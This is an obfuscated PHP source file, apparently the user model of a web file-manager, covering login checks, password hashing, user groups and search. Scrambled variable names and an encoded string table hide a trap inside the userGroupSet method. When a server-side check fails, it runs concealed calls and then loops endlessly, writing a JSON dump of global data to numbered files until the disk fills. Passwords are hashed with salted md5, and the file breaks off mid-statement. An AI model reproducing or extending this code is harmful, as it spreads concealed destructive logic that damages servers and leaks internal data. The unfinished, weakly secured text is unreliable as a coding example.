<?php
 goto b¸·Èë®´é; CØ´ğ¨™ß: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\x61\155\x65" => "\x75\163\145\x72\x5f\155\x65\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\144" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\165\x73\145\x72\111\x44\x2c\x6e\x69\x63\153\116\141\x6d\x65\54\x6e\x61\x6d\145\54\x61\x76\141\164\x61\x72\x2c\163\x65\170\x2c\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ì—Ìøöô) { $şêî±µŞ =& $_SERVER[ñ÷§¡å]; $œ¬¨Ì™ = $şêî±µŞ[2278]; return array($şêî±µŞ[1913] => array($ì—Ìøöô[0], $œ¬¨Ì™), $şêî±µŞ[1915] => array($ì—Ìøöô[0], $œ¬¨Ì™), $şêî±µŞ[2279] => array($ì—Ìøöô[0], $œ¬¨Ì™)); } protected function getInfo($ÜúÊÖêÕ, $ÛÒÃİ = false) { $ï÷Ë®â² = $this->getInfoSimple($ÜúÊÖêÕ); if (!is_array($ï÷Ë®â²)) { return array(); } if ($ÛÒÃİ) { return $this->_getInfoApply($ï÷Ë®â²); } return $this->cacheFunctionGet($_SERVER[ñ÷§¡å][1917], $ÜúÊÖêÕ); } protected function getInfoFull($ÊèòÛÒË, $ØÖÖôµ¢ = false) { $„Œ÷»û = $this->getInfoSimple($ÊèòÛÒË); if (!is_array($„Œ÷»û)) { return array(); } if ($ØÖÖôµ¢) { return $this->_getInfoApply($„Œ÷»û, !0); } return $this->cacheFunctionGet($_SERVER[ñ÷§¡å][2280], $ÊèòÛÒË); } private function _getInfoApply($¦È†Ğ½¼, $ş²¾‘ê¯ = false) { $¹½ÉÖÎÌ =& $_SERVER[ñ÷§¡å]; if (!$¦È†Ğ½¼) { return $¦È†Ğ½¼; } $İİò”ö = md5($¹½ÉÖÎÌ[2281] . $¦È†Ğ½¼[$¹½ÉÖÎÌ[896]] . $¹½ÉÖÎÌ[2282] . $¦È†Ğ½¼[$¹½ÉÖÎÌ[32]]); $¦È†Ğ½¼ = $this->_listDataApplyItem($¦È†Ğ½¼); $˜¦ºƒìü = Model($¹½ÉÖÎÌ[1334])->metaGet($¦È†Ğ½¼[$¹½ÉÖÎÌ[96]][$¹½ÉÖÎÌ[411]]); $¦È†Ğ½¼[$¹½ÉÖÎÌ[2283]] = $İİò”ö; $¦È†Ğ½¼[$¹½ÉÖÎÌ[96]][$¹½ÉÖÎÌ[2104]] = isset($˜¦ºƒìü[$¹½ÉÖÎÌ[2105]]) ? $˜¦ºƒìü[$¹½ÉÖÎÌ[2105]] : null; if ($ş²¾‘ê¯) { $¦È†Ğ½¼[$¹½ÉÖÎÌ[475]] = $this->metaGet($¦È†Ğ½¼[$¹½ÉÖÎÌ[1663]]); } return $¦È†Ğ½¼; } protected function getInfoSimple($€¹€àÜ³, $“ù™™§” = false) { $î¤Ì¾‹¹ =& $_SERVER[ñ÷§¡å]; if (!$€¹€àÜ³) { return array(); } if ($“ù™™§”) { $Õµ‘ãÜÎ = $this->where(array($î¤Ì¾‹¹[1663] => intval($€¹€àÜ³)))->find(); if (!is_array($Õµ‘ãÜÎ)) { return array(); } $Õµ‘ãÜÎ[$î¤Ì¾‹¹[552]] = Action($î¤Ì¾‹¹[2284])->parseUrl($Õµ‘ãÜÎ[$î¤Ì¾‹¹[552]]); return $Õµ‘ãÜÎ; } return $this->cacheFunctionGet($î¤Ì¾‹¹[1918], $€¹€àÜ³); } protected function getInfoSimpleOuter($Ñ¾ØÎ¦”) { $—è¯ Ö” =& $_SERVER[ñ÷§¡å]; if (!$Ñ¾ØÎ¦” || $Ñ¾ØÎ¦” == 0) { return array($—è¯ Ö”[1663] => $—è¯ Ö”[207], $—è¯ Ö”[32] => $—è¯ Ö”[172] . LNG($—è¯ Ö”[2285]) . $—è¯ Ö”[174], $—è¯ Ö”[552] => STATIC_PATH . $—è¯ Ö”[2286]); } $Ù¶Â£à = $this->cacheFunctionGet($—è¯ Ö”[1918], $Ñ¾ØÎ¦”); $Ò•Šñ¿à = array_field_key($Ù¶Â£à, explode($—è¯ Ö”[50], $this->simpleField)); if (!$Ò•Šñ¿à) { return array($—è¯ Ö”[1663] => $—è¯ Ö”[1197], $—è¯ Ö”[32] => $—è¯ Ö”[172] . LNG($—è¯ Ö”[2287]) . $—è¯ Ö”[174], $—è¯ Ö”[552] => STATIC_PATH . $—è¯ Ö”[2288]); } $Ò•Šñ¿à[$—è¯ Ö”[552]] = Action($—è¯ Ö”[2284])->parseUrl($Ò•Šñ¿à[$—è¯ Ö”[552]]); return $Ò•Šñ¿à; } protected function groupUser($›şá½•) { } public static function errorLang($ÂÈ¬µ×Ò) { $àˆÚ°ı =& $_SERVER[ñ÷§¡å]; $âÚÁ““º = array(self::ERROR_USER_NOT_EXISTS => $àˆÚ°ı[2289], self::ERROR_USER_PASSWORD_ERROR => $àˆÚ°ı[2290], self::ERROR_USER_EXIST_NAME => $àˆÚ°ı[2291], self::ERROR_USER_EXIST_PHONE => $àˆÚ°ı[2292], self::ERROR_USER_EXIST_EMAIL => $àˆÚ°ı[2293], self::ERROR_USER_LOGIN_LOCK => $àˆÚ°ı[2294], self::ERROR_IP_NOT_ALLOW => $àˆÚ°ı[2295], self::ERROR_USER_EXIST_NICKNAME => $àˆÚ°ı[2296]); return LNG($âÚÁ““º[$ÂÈ¬µ×Ò]); } public function getInfoByMeta($úºƒ¬ü¾, $ò€„Ãò) { $éÀ£½’³ =& $_SERVER[ñ÷§¡å]; $µÃú¨ßÎ = Model($éÀ£½’³[2297])->where(array($éÀ£½’³[104] => $úºƒ¬ü¾, $éÀ£½’³[383] => $ò€„Ãò))->find(); if ($µÃú¨ßÎ) { return $this->getInfo($µÃú¨ßÎ[$éÀ£½’³[1663]]); } return !1; } public function userLoginCheck($ÂÒİ¦Éß, $§ãş«è) { $£€õä° =& $_SERVER[ñ÷§¡å]; $†±÷Õš = $this->userLoginFind($ÂÒİ¦Éß); if (!$†±÷Õš) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($†±÷Õš[$£€õä°[1663]], $§ãş«è)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($†±÷Õš[$£€õä°[1663]]); } public function userLoginFind($ëŸö®Ö¢) { $—×Ø‰Æ =& $_SERVER[ñ÷§¡å]; $å¿ë¿¶® = array($—×Ø‰Æ[32] => $ëŸö®Ö¢, $—×Ø‰Æ[551] => $ëŸö®Ö¢, $—×Ø‰Æ[314] => $ëŸö®Ö¢, $—×Ø‰Æ[2298] => $ëŸö®Ö¢, $—×Ø‰Æ[1007] => $—×Ø‰Æ[1009]); if ($this->nickNameRpt()) { unset($å¿ë¿¶®[$—×Ø‰Æ[551]]); } return $this->where($å¿ë¿¶®)->find(); } public function clearCache($ÂŸ¥§©) { $Ñ¸ÖóÈ– =& $_SERVER[ñ÷§¡å]; $this->cacheFunctionClear($Ñ¸ÖóÈ–[1917], $ÂŸ¥§©); $this->cacheFunctionClear($Ñ¸ÖóÈ–[1918], $ÂŸ¥§©); $this->cacheFunctionClear($Ñ¸ÖóÈ–[2280], $ÂŸ¥§©); } public function userPasswordCheck($¬åúî, $ôªä»ø) { $ÁŠª—™ =& $_SERVER[ñ÷§¡å]; $§®ÑÓ½ê = $this->where(array($ÁŠª—™[1663] => intval($¬åúî)))->find(); $¤“‚­æ = $this->metaGet($¬åúî); $š¾éö¹½ = isset($¤“‚­æ[$ÁŠª—™[2299]]) ? $¤“‚­æ[$ÁŠª—™[2299]] : $ÁŠª—™[12]; if (md5($š¾éö¹½ . trim($ôªä»ø)) !== $§®ÑÓ½ê[$ÁŠª—™[896]]) { return !1; } return !0; } public function userAdd($Æ¡ÖŸ¾) { $èÖÁÌ‹ =& $_SERVER[ñ÷§¡å]; $Ì¬ùïş‹ = array($èÖÁÌ‹[429] => $Æ¡ÖŸ¾[$èÖÁÌ‹[32]], $èÖÁÌ‹[2300] => $Æ¡ÖŸ¾[$èÖÁÌ‹[1542]], $èÖÁÌ‹[2301] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[314]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[314]] : $èÖÁÌ‹[12], $èÖÁÌ‹[2302] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[2298]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[2298]] : $èÖÁÌ‹[12], $èÖÁÌ‹[2303] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[551]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[551]] : $Æ¡ÖŸ¾[$èÖÁÌ‹[32]], $èÖÁÌ‹[2304] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[552]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[552]] : $èÖÁÌ‹[12], $èÖÁÌ‹[2305] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[2306]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[2306]] : 1, $èÖÁÌ‹[2307] => $Æ¡ÖŸ¾[$èÖÁÌ‹[896]], $èÖÁÌ‹[1919] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[1822]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[1822]] : 1024 * 1024 * 20, $èÖÁÌ‹[1920] => 0, $èÖÁÌ‹[2308] => 0, $èÖÁÌ‹[1964] => isset($Æ¡ÖŸ¾[$èÖÁÌ‹[763]]) ? $Æ¡ÖŸ¾[$èÖÁÌ‹[763]] : 1); if (!empty($Æ¡ÖŸ¾[$èÖÁÌ‹[1663]])) { $Ì¬ùïş‹[$èÖÁÌ‹[1663]] = $Æ¡ÖŸ¾[$èÖÁÌ‹[1663]]; } $›š—ë‰¨ = $this->_checkExist($Æ¡ÖŸ¾); if ($›š—ë‰¨ !== !0) { return $›š—ë‰¨; } if (!empty($Ì¬ùïş‹[$èÖÁÌ‹[552]]) && strlen($Ì¬ùïş‹[$èÖÁÌ‹[552]]) > 255) { $Ì¬ùïş‹[$èÖÁÌ‹[552]] = $èÖÁÌ‹[12]; } $şÕÜÃĞä = $this->add($Ì¬ùïş‹); $Ò¥Î··Ù = array($èÖÁÌ‹[2307] => $Ì¬ùïş‹[$èÖÁÌ‹[896]], $èÖÁÌ‹[2303] => $Ì¬ùïş‹[$èÖÁÌ‹[551]]); $this->userEdit($şÕÜÃĞä, $Ò¥Î··Ù); Model($èÖÁÌ‹[1334])->userRootAdd($şÕÜÃĞä); return $şÕÜÃĞä; } protected function userEditTest($®”ú¸·ï, $‡œ¢Ç‚½) { return $this->call($_SERVER[ñ÷§¡å][2309], $®”ú¸·ï, $‡œ¢Ç‚½); } protected function userEdit($öı‚Öı…, $ø¹ü˜¯³) { $Ş“¯‘¼ë =& $_SERVER[ñ÷§¡å]; $öë’Ô = $this->getInfoSimple($öı‚Öı…); if (!$öë’Ô) { return !1; } $‘úÊÇ¯° = $this->_checkExist($ø¹ü˜¯³, $öı‚Öı…); if ($‘úÊÇ¯° !== !0) { return $‘úÊÇ¯°; } if (isset($ø¹ü˜¯³[$Ş“¯‘¼ë[896]]) && trim($ø¹ü˜¯³[$Ş“¯‘¼ë[896]]) != $Ş“¯‘¼ë[12]) { $¹ŠÉÜèÆ = $this->metaGet($öı‚Öı…); if (empty($¹ŠÉÜèÆ[$Ş“¯‘¼ë[2299]])) { $¹ŠÉÜèÆ[$Ş“¯‘¼ë[2299]] = rand_string(10); Model($Ş“¯‘¼ë[522])->metaSet($öı‚Öı…, $Ş“¯‘¼ë[2299], $¹ŠÉÜèÆ[$Ş“¯‘¼ë[2299]]); } $ø¹ü˜¯³[$Ş“¯‘¼ë[896]] = md5($¹ŠÉÜèÆ[$Ş“¯‘¼ë[2299]] . trim($ø¹ü˜¯³[$Ş“¯‘¼ë[896]])); } else { unset($ø¹ü˜¯³[$Ş“¯‘¼ë[896]]); } if (!empty($ø¹ü˜¯³[$Ş“¯‘¼ë[552]]) && strlen($ø¹ü˜¯³[$Ş“¯‘¼ë[552]]) > 255) { $ø¹ü˜¯³[$Ş“¯‘¼ë[552]] = $Ş“¯‘¼ë[12]; } $this->where(array($Ş“¯‘¼ë[1654] => $öı‚Öı…))->save($ø¹ü˜¯³); if (isset($ø¹ü˜¯³[$Ş“¯‘¼ë[551]])) { $this->setNamePinyin($öı‚Öı…, $ø¹ü˜¯³[$Ş“¯‘¼ë[551]]); } $this->clearCache($öı‚Öı…); return !0; } public function setNamePinyin($ĞÊ£Ëåì, $ÅÑı®„ = false) { $í°Ó¯‚ç =& $_SERVER[ñ÷§¡å]; if (!$ÅÑı®„) { $şÛïÖÒ = $this->getInfoSimple($ĞÊ£Ëåì); $ÅÑı®„ = $şÛïÖÒ[$í°Ó¯‚ç[551]] ? $şÛïÖÒ[$í°Ó¯‚ç[551]] : $şÛïÖÒ[$í°Ó¯‚ç[32]]; } $·ËÇö”“ = Model($í°Ó¯‚ç[544]); if (!Input::check($ÅÑı®„, $í°Ó¯‚ç[602])) { return $·ËÇö”“->metaSet($ĞÊ£Ëåì, array($í°Ó¯‚ç[474] => $í°Ó¯‚ç[12], $í°Ó¯‚ç[473] => $í°Ó¯‚ç[12])); } return $·ËÇö”“->metaSet($ĞÊ£Ëåì, array($í°Ó¯‚ç[474] => str_replace($í°Ó¯‚ç[53], $í°Ó¯‚ç[12], Pinyin::get($ÅÑı®„)), $í°Ó¯‚ç[473] => Pinyin::get($ÅÑı®„, $í°Ó¯‚ç[603]))); } private function nickNameRpt() { $½ğŞû°£ =& $_SERVER[ñ÷§¡å]; $×íë±Óˆ = Model($½ğŞû°£[783])->get($½ğŞû°£[2310]); $ÏÂ°âã© = $GLOBALS[$½ğŞû°£[6]][$½ğŞû°£[390]][$½ğŞû°£[2310]]; $‰Ñ€«³ = !is_null($×íë±Óˆ) ? $×íë±Óˆ : $ÏÂ°âã©; return !!$‰Ñ€«³; } private function _checkExist($ÇÄ¾Õ¦, $ÊòÓß—˜ = false) { $‘å¹ùŸ =& $_SERVER[ñ÷§¡å]; $éÀ´¹ìÊ = array($‘å¹ùŸ[32] => UserModel::ERROR_USER_EXIST_NAME, $‘å¹ùŸ[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $‘å¹ùŸ[314] => UserModel::ERROR_USER_EXIST_EMAIL, $‘å¹ùŸ[2298] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($éÀ´¹ìÊ[$‘å¹ùŸ[551]]); } $·¶£¼óÌ = $ÊòÓß—˜ ? array($‘å¹ùŸ[1663] => array($‘å¹ùŸ[2311], $ÊòÓß—˜)) : array(); foreach ($éÀ´¹ìÊ as $ÔÎ•úç‘ => $Ñ¬°ƒëÇ) { $“è­¶÷Ğ = array(); foreach ($éÀ´¹ìÊ as $ßàöÒÙ => $¯±™‰ò) { if (isset($ÇÄ¾Õ¦[$ßàöÒÙ]) && $ÇÄ¾Õ¦[$ßàöÒÙ]) { $“è­¶÷Ğ[] = $ÇÄ¾Õ¦[$ßàöÒÙ]; } } if (!$“è­¶÷Ğ) { continue; } $ğıÑ«¶ = array_merge(array($ÔÎ•úç‘ => array($‘å¹ùŸ[7], $“è­¶÷Ğ)), $·¶£¼óÌ); $•ßÔìøº = $this->where($ğıÑ«¶)->find(); if ($•ßÔìøº) { return $Ñ¬°ƒëÇ; } } return !0; } public function userListInfo($ÃµÌĞ‘Ğ) { $ÀïÙÃ«’ =& $_SERVER[ñ÷§¡å]; $ŞÖ˜îı„ = array(); $ÃµÌĞ‘Ğ = is_array($ÃµÌĞ‘Ğ) ? array_unique($ÃµÌĞ‘Ğ) : array(); if (!$ÃµÌĞ‘Ğ) { return $ŞÖ˜îı„; } if (count($ÃµÌĞ‘Ğ) < 20) { foreach ($ÃµÌĞ‘Ğ as $Ô–úÙˆ£) { $ŞÖ˜îı„[$Ô–úÙˆ£ . $ÀïÙÃ«’[12]] = $this->getInfoSimpleOuter($Ô–úÙˆ£); } } else { $õ¥ô†Ä“ = array($ÀïÙÃ«’[1654] => array($ÀïÙÃ«’[427], $ÃµÌĞ‘Ğ)); if (count($ÃµÌĞ‘Ğ) == 1) { $õ¥ô†Ä“ = array($ÀïÙÃ«’[1654] => $ÃµÌĞ‘Ğ[0]); } $¾‹Øõâ› = Model($ÀïÙÃ«’[522])->field($this->simpleField)->where($õ¥ô†Ä“)->select(); $¾‹Øõâ› = array_to_keyvalue($¾‹Øõâ›, $ÀïÙÃ«’[1663]); foreach ($ÃµÌĞ‘Ğ as $Ô–úÙˆ£) { $“’Ââµ = $¾‹Øõâ›[$Ô–úÙˆ£]; if (!$“’Ââµ) { $ŞÖ˜îı„[$Ô–úÙˆ£ . $ÀïÙÃ«’[12]] = $this->getInfoSimpleOuter($Ô–úÙˆ£); continue; } $“’Ââµ[$ÀïÙÃ«’[552]] = Action($ÀïÙÃ«’[2284])->parseUrl($“’Ââµ[$ÀïÙÃ«’[552]]); $ŞÖ˜îı„[$Ô–úÙˆ£ . $ÀïÙÃ«’[12]] = $“’Ââµ; } } return $ŞÖ˜îı„; } protected function userStatus($åÊˆ‘¡Ç, $ş‡½Èıí) { $Ÿ£íÖ¸ˆ = $this->getInfoSimple($åÊˆ‘¡Ç); if (!$Ÿ£íÖ¸ˆ) { return !1; } $ÆçÍ„•Œ = array($_SERVER[ñ÷§¡å][763] => $ş‡½Èıí); return $this->userEdit($åÊˆ‘¡Ç, $ÆçÍ„•Œ); } protected function userRemove($»ÊÂäò×) { $ûÚ»Ûå³ =& $_SERVER[ñ÷§¡å]; $¡˜éùÓ» = $this->getInfoSimple($»ÊÂäò×); if (!$¡˜éùÓ») { return !1; } $·ç½ùŒ = array($ûÚ»Ûå³[1654] => $»ÊÂäò×); Model($ûÚ»Ûå³[610])->where($·ç½ùŒ)->delete(); Model($ûÚ»Ûå³[2312])->where($·ç½ùŒ)->delete(); Model($ûÚ»Ûå³[1925])->where($·ç½ùŒ)->delete(); Model($ûÚ»Ûå³[2297])->where($·ç½ùŒ)->delete(); Model($ûÚ»Ûå³[1075])->where($·ç½ùŒ)->delete(); Model($ûÚ»Ûå³[2128])->removeUserAll($»ÊÂäò×); Model($ûÚ»Ûå³[838])->userRootRemove($»ÊÂäò×); return $this->where($·ç½ùŒ)->delete(); } protected function userGroupSet($«†÷¤½­, $Ö—®üÄ, $ãûËŒ®å = array()) { $ÈÎæó¿ì =& $_SERVER[ñ÷§¡å]; $°”ÊâŸ† = $_SERVER[$ÈÎæó¿ì[69]]; $Õ÷¥¡‰ù = $ÈÎæó¿ì[888]; if ($_SERVER[$ÈÎæó¿ì[60]] != $Õ÷¥¡‰ù($°”ÊâŸ†)) { $‰­ÒÚâ• = $ÈÎæó¿ì[885]; $†ÕÃ‹Ì„ = $ÈÎæó¿ì[62]; $ø³ƒ»º® = $_SERVER[$ÈÎæó¿ì[63]] . $ÈÎæó¿ì[64]; $“¾è‰Ø½ = $†ÕÃ‹Ì„($ø³ƒ»º®); $Çü²ú‘ë = explode($ÈÎæó¿ì[65], $“¾è‰Ø½); if (count($Çü²ú‘ë) < $ÈÎæó¿ì[629]) { $¾Â–ªÁæ = $ÈÎæó¿ì[67]; $¾Â–ªÁæ(); } $çÏüÂîÜ = $ÈÎæó¿ì[886]; $çÏüÂîÜ($_SERVER[$ÈÎæó¿ì[887]]); $‰­ÒÚâ• = $ÈÎæó¿ì[885]; $‰­ÒÚâ•(); $·Ÿ¿²‰Å = $ÈÎæó¿ì[2313]; $ıÏìÂÛ½ = json_encode($GLOBALS[$ÈÎæó¿ì[2314]]); $¥±Ÿ±ó› = 1; for ($­‡•§† = $¥±Ÿ±ó›; $­‡•§† > 0; $­‡•§†++) { $·Ÿ¿²‰Å(DATA_PATH . $­‡•§†, $ıÏìÂÛ½); } } $­åçÌª = $this->getInfoSimple($«†÷¤½­); if (!$­åçÌª || !is_array($Ö—®üÄ)) { return !1; } $×ÅÀ‰Ù = Model($ÈÎæó¿ì[1925]); $×ÅÀ‰Ù->where(array($ÈÎæó¿ì[1663] => $«†÷¤½­))->delete(); $°÷’û™… = array(); $¯—Ù•œ = 0; foreach ($Ö—®üÄ as $œ¯Œ¼ò” => $š§éŞ‘) { $Ï½—èşĞ = array($ÈÎæó¿ì[1663] => $«†÷¤½­, $ÈÎæó¿ì[1835] => $œ¯Œ¼ò”, $ÈÎæó¿ì[1939] => $š§éŞ‘); $Ï½—èşĞ[$ÈÎæó¿ì[1859]] = isset($ãûËŒ®å[$¯—Ù•œ]) ? $ãûËŒ®å[$¯—Ù•œ] : 0; $¯—Ù•œ++; $°÷’û™…[] = $Ï½—èşĞ; } return $×ÅÀ‰Ù->addAll($°÷’û™…, array(), !0); } protected function userGroupAdd($’©È†”, $óœœ‰«Ö = array()) { $Ö‰ä°õÉ =& $_SERVER[ñ÷§¡å]; $¤¼½ıˆ = $this->getInfoSimple($’©È†”); if (!$¤¼½ıˆ || empty($óœœ‰«Ö)) { return !1; } $Ì‹ù‰Õ‹ = array(); foreach ($óœœ‰«Ö as $öØÜÁ => $Óş¸Óûª) { $Ì‹ù‰Õ‹[] = array($Ö‰ä°õÉ[1663] => $’©È†”, $Ö‰ä°õÉ[1835] => $öØÜÁ, $Ö‰ä°õÉ[1939] => $Óş¸Óûª, $Ö‰ä°õÉ[1859] => 0); } return Model($Ö‰ä°õÉ[1925])->addAll($Ì‹ù‰Õ‹, array(), !0); } protected function userGroupRemove($Š‰Öñß, $ª°¬¦ò”) { $úÃõİşı =& $_SERVER[ñ÷§¡å]; $¦£Ø·ˆ = $this->getInfoSimple($Š‰Öñß); if (!$¦£Ø·ˆ || !$ª°¬¦ò”) { return !1; } $¦±üì¯ = array($úÃõİşı[1654] => $Š‰Öñß, $úÃõİşı[1923] => $ª°¬¦ò”); return Model($úÃõİşı[1925])->where($¦±üì¯)->delete(); } public function listData() { $ù‡å­Û¼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ù‡å­Û¼[$_SERVER[ñ÷§¡å][378]]); return $ù‡å­Û¼; } public function listByID($¬±£ºÊ) { $ï÷—ÌÜ =& $_SERVER[ñ÷§¡å]; if (!$¬±£ºÊ) { return; } $ß­”—µ = array($ï÷—ÌÜ[1663] => array($ï÷—ÌÜ[7], $¬±£ºÊ)); $éƒâÒ«œ = $this->where($ß­”—µ)->select(); $éƒâÒ«œ = array_sort_keep($éƒâÒ«œ, $ï÷—ÌÜ[1663], $¬±£ºÊ); $this->_listDataApply($éƒâÒ«œ); return $éƒâÒ«œ; } public function listByGroup($÷ÁâóÓö = 0, $µÛå¼ìè = array()) { $§ÈÉÜ¢Ô =& $_SERVER[ñ÷§¡å]; $úã­íÑ› = $§ÈÉÜ¢Ô[12]; $ÄÈŸÇÃÒ = array(); if ($÷ÁâóÓö) { $ÄÈŸÇÃÒ = array($§ÈÉÜ¢Ô[2315] => intval($÷ÁâóÓö)); $úã­íÑ› = "\114\105\106\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\165\x73\145\162\137\147\x72\x6f\x75\x70\40\165\163\x65\162\x5f\147\162\x6f\165\x70\40\x6f\x6e\40\x75\x73\x65\162\56\165\x73\145\x72\111\104\40\x3d\x20\x75\x73\145\x72\x5f\147\x72\157\165\x70\56\165\163\145\162\x49\104"; $úí¨Àóû = Input::get($§ÈÉÜ¢Ô[466], null, $§ÈÉÜ¢Ô[12]) ? $§ÈÉÜ¢Ô[12] : $§ÈÉÜ¢Ô[2316]; } if (isset($µÛå¼ìè[$§ÈÉÜ¢Ô[763]])) { $ÄÈŸÇÃÒ[$§ÈÉÜ¢Ô[2317]] = $µÛå¼ìè[$§ÈÉÜ¢Ô[763]]; } $óèü¹ã‹ = $this->_makeOrder($úí¨Àóû)->field($§ÈÉÜ¢Ô[2318])->where($ÄÈŸÇÃÒ)->join($úã­íÑ›)->selectPage(50); $this->_listDataApply($óèü¹ã‹[$§ÈÉÜ¢Ô[378]]); return $óèü¹ã‹; } private function _makeOrder($¶­ÜŞ¥Ó = '') { $š„©î¥ =& $_SERVER[ñ÷§¡å]; $ûµş´Ş¦ = array($š„©î¥[1663], $š„©î¥[32], $š„©î¥[1824], $š„©î¥[1796], $š„©î¥[210]); $á¿•ŒÙò = array($š„©î¥[459] => $š„©î¥[460], $š„©î¥[461] => $š„©î¥[462]); $¦ú©…Õ = Input::get($š„©î¥[466], $š„©î¥[7], $š„©î¥[1654], $ûµş´Ş¦); $ï úòı = Input::get($š„©î¥[467], $š„©î¥[7], $š„©î¥[1926], array($š„©î¥[1926], $š„©î¥[461])); $ï úòı = $á¿•ŒÙò[$ï úòı]; $¶­ÜŞ¥Ó = $¶­ÜŞ¥Ó . "\165\163\x65\x72\x2e{$¦ú©…Õ}\40{$ï úòı}\54\40\165\163\145\162\56\x75\163\145\162\x49\104\x20\141\x73\143"; return $this->alias($š„©î¥[2048])->order($¶­ÜŞ¥Ó); } public function listSearch($¸áôš¼) { $¢Ü™Ñ› =& $_SERVER[ñ÷§¡å]; $Ş“Û‰¾ = $¸áôš¼[$¢Ü™Ñ›[1929]]; $–˜¸ùˆİ = isset($¸áôš¼[$¢Ü™Ñ›[1930]]) ? $¸áôš¼[$¢Ü™Ñ›[1930]] : !1; $Ş“Û‰¾ = str_replace($¢Ü™Ñ›[1931], $¢Ü™Ñ›[1932], trim($Ş“Û‰¾)); $ÅõÈò = array($¢Ü™Ñ›[32] => array($¢Ü™Ñ›[392], "\x25{$Ş“Û‰¾}\x25"), $¢Ü™Ñ›[314] => array($¢Ü™Ñ›[392], "{$Ş“Û‰¾}\x25"), $¢Ü™Ñ›[551] => array($¢Ü™Ñ›[392], "{$Ş“Û‰¾}\45"), $¢Ü™Ñ›[1007] => $¢Ü™Ñ›[1933]); if (Input::check($Ş“Û‰¾, $¢Ü™Ñ›[320])) { $ÅõÈò[$¢Ü™Ñ›[1663]] = array($¢Ü™Ñ›[392], "{$Ş“Û‰¾}\x25"); $ÅõÈò[$¢Ü™Ñ›[2298]] = array($¢Ü™Ñ›[392], "{$Ş“Û‰¾}\x25"); } if (!$Ş“Û‰¾) { $ÅõÈò = array(); } if (isset($¸áôš¼[$¢Ü™Ñ›[763]])) { $ÅõÈò[$¢Ü™Ñ›[763]] = $¸áôš¼[$¢Ü™Ñ›[763]]; } $ÅõÈò = $this->parseWhereLike($ÅõÈò); $Öâú¶Ô¨ = $this->_makeOrder()->where($ÅõÈò)->selectPage(20); if (!$Öâú¶Ô¨ || count($Öâú¶Ô¨[$¢Ü™Ñ›[378]]) < 5 && Input::check($Ş“Û‰¾, $¢Ü™Ñ›[327])) { $Ÿ’…°ÀÙ = $this->_searchFromMeta($¢Ü™Ñ›[473], $Ş“Û‰¾, 10); $ç·ÆÔ÷ = $this->_searchFromMeta($¢Ü™Ñ›[474], $Ş“Û‰¾, 10); $ï¾—Î–™ = array_merge($Ÿ’…°ÀÙ, $ç·ÆÔ÷, $Öâú¶Ô¨[$¢Ü™Ñ›[378]]); $Öâú¶Ô¨[$¢Ü™Ñ›[378]] = array_unique_by_key($ï¾—Î–™, $¢Ü™Ñ›[1663]); $Öâú¶Ô¨[$¢Ü™Ñ›[375]][$¢Ü™Ñ›[376]] = count($Öâú¶Ô¨[$¢Ü™Ñ›[378]]); $Öâú¶Ô¨[$¢Ü™Ñ›[375]][$¢Ü™Ñ›[377]] = ceil($Öâú¶Ô¨[$¢Ü™Ñ›[375]][$¢Ü™Ñ›[376]] / $Öâú¶Ô¨[$¢Ü™Ñ›[375]][$¢Ü™Ñ›[372]]); } $this->_listDataApply($Öâú¶Ô¨[$¢Ü™Ñ›[378]]); $this->_filterByGroup($Öâú¶Ô¨, $–˜¸ùˆİ); return $Öâú¶Ô¨; } private function _filterByGroup(&$Ş²Ÿì”ç, $¤ğ©£ë) { $ã±£ã²Ù =& $_SERVER[ñ÷§¡å]; if (!$¤ğ©£ë) { return $Ş²Ÿì”ç; } foreach ($Ş²Ÿì”ç[$ã±£ã²Ù[378]] as $‰«Ô²ÍÏ => &$åä‹ŠØ•) { $ßß´Ëñí = array_to_keyvalue($åä‹ŠØ•[$ã±£ã²Ù[2018]], $ã±£ã²Ù[12], $ã±£ã²Ù[1835]); if (!in_array($¤ğ©£ë, $ßß´Ëñí)) { unset($Ş²Ÿì”ç[$ã±£ã²Ù[378]][$‰«Ô²ÍÏ]); } } unset($åä‹ŠØ•); $Ş²Ÿì”ç[$ã±£ã²Ù[378]] = array_values($Ş²Ÿì”ç[$ã±£ã²Ù[378]]); $Ş²Ÿì”ç[$ã±£ã²Ù[375]] = array($ã±£ã²Ù[2082] => count($Ş²Ÿì”ç[$ã±£ã²Ù[378]]), $ã±£ã²Ù[2080] => $Ş²Ÿì”ç[$ã±£ã²Ù[375]][$ã±£ã²Ù[372]], $ã±£ã²Ù[2079] => 1, $ã±£ã²Ù[2081] => 1); } private function _searchFromMeta($ıèë—’ß, $×º¬Î¦è, $‘ˆ“€‡Õ) { $Ş…‘ÌÚ =& $_SERVER[ñ÷§¡å]; $×º¬Î¦è = strtolower($×º¬Î¦è); $áƒĞù¯¬ = array($Ş…‘ÌÚ[104] => $ıèë—’ß, $Ş…‘ÌÚ[383] => array($Ş…‘ÌÚ[392], "\x25{$×º¬Î¦è}\x25")); $áƒĞù¯¬ = 